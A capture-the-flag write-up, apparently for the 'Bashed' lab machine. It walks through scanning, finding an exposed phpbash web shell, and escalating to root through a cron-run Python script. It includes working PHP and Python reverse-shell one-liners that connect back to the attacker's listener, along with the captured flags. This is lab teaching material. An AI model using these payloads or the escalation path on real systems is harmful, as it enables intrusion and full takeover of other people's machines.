![image](https://user-images.githubusercontent.com/105310322/187503139-1330b005-f9be-4a05-9bf9-5296ecc3d166.png)

### Tools: Nmap, 

Running Nmap we get port 80 running Apache 2.4.18. Curl did not give anything extra and an Nmap scripot scan did not find anything. We did get some luck with Dirb and we can check that part out.

```console
└──╼ [★]$ sudo nmap -sC -A -O 10.129.64.44
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 17:02 BST
Nmap scan report for 10.129.64.44
Host is up (0.0048s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/15%OT=80%CT=1%CU=34558%PV=Y%DS=2%DC=T%G=Y%TM=62FA6E1
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 995/tcp)
HOP RTT     ADDRESS
1   5.54 ms 10.10.14.1
2   4.90 ms 10.129.64.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.79 seconds
```
```console
└──╼ [★]$ curl -I http://10.129.64.44
HTTP/1.1 200 OK
Date: Mon, 15 Aug 2022 16:04:23 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 04 Dec 2017 23:03:42 GMT
ETag: "1e3f-55f8bbac32f80"
Accept-Ranges: bytes
Content-Length: 7743
Vary: Accept-Encoding
Content-Type: text/html
```

```console
└──╼ [★]$ dirb http://10.129.64.44

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 15 17:06:04 2022
URL_BASE: http://10.129.64.44/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.64.44/ ----
==> DIRECTORY: http://10.129.64.44/css/                                        
==> DIRECTORY: http://10.129.64.44/dev/                                        
==> DIRECTORY: http://10.129.64.44/fonts/                                      
==> DIRECTORY: http://10.129.64.44/images/                                     
+ http://10.129.64.44/index.html (CODE:200|SIZE:7743)                          
==> DIRECTORY: http://10.129.64.44/js/                                         
==> DIRECTORY: http://10.129.64.44/php/                                        
+ http://10.129.64.44/server-status (CODE:403|SIZE:300)                        
==> DIRECTORY: http://10.129.64.44/uploads/                                    
                                                                               
---- Entering directory: http://10.129.64.44/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/dev/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/php/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.129.64.44/uploads/ ----
+ http://10.129.64.44/uploads/index.html (CODE:200|SIZE:14)                    
                                                                               
-----------------
END_TIME: Mon Aug 15 17:06:36 2022
DOWNLOADED: 9224 - FOUND: 3
```
The /dev directory looks the most interesting and digging slightly further takes us to http://10.129.64.44/dev/phpbash.php

Easy day. We can already navigate to and grab the user flag. Since we have a php bash lets create a reverse shell with it.

```console
www-data@bashed:/var/www/html/dev# ls
phpbash.min.php
phpbash.php
```
```console
www-data@bashed
:/home/arrexel# cat user.txt

343cfcbe7fd570aa1a5218f0db7e0946
```
We set up the listener and run the script and we are in.

```console
bashed:/# php -r '$sock=fsockopen("10.10.14.93",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```console
└──╼ [★]$ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.64.44.
Ncat: Connection from 10.129.64.44:33962.
/bin/sh: 0: can't access tty; job control turned off
$ 
```
We still can't do anything different but running sudo -l shows that scriptmanager can be used. Note: running the reverse shell to use script manager is required since the limited php shell from the webpage would not allow the sudo command with scriptmanager.

```console
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager bash -i
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
scriptmanager@bashed:/$ ls
```
Awesome now we are scriptmanager but we cannot access the root directory yet. There is an interesting directory labeled /scripts. This directory has a python script and a text file. My first assumption was that I could create a script to read the root.txt flag but my scripting is limited. I noticed that the .txt and .py were updating at the same time which suggests a cronjob being ran by root. With this we have our last step.

```console
scriptmanager@bashed:/$ cd scripts
cd scripts
scriptmanager@bashed:/scripts$ ls
ls
test.py
test.txt
scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ 
```
```console
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 20
drwxrwxr--  2 scriptmanager scriptmanager 4096 Aug 15 09:37 .
drwxr-xr-x 23 root          root          4096 Jun  2 07:25 ..
-rw-r--r--  1 scriptmanager scriptmanager   66 Aug 15 09:55 sol.py
-rw-r--r--  1 scriptmanager scriptmanager  110 Aug 15 10:19 test.py
-rw-r--r--  1 root          root            12 Aug 15 10:19 test.txt
```
We are going to set up 1 last reverse shell in order to gain root. We are going to make our own reverse shell script taken from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

We are going to use the python reverse shell since its being executed in a python script and set up our listener to catch it. After a minute or so the cronjob executes the script from the directory and we get our reverse shell and the flag!!

```console
scriptmanager@bashed:/scripts$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.93",1235));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > sol.py
<);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > sol.py  
```

```console
└──╼ [★]$ nc -lvnp 1235
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 10.129.64.44.
Ncat: Connection from 10.129.64.44:46748.
# ls
ls
sol.py	test.txt
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cat /root/root.txt
353dbd73edc7c3073b68d735599731c9
```
WHOOOOOO!!!!
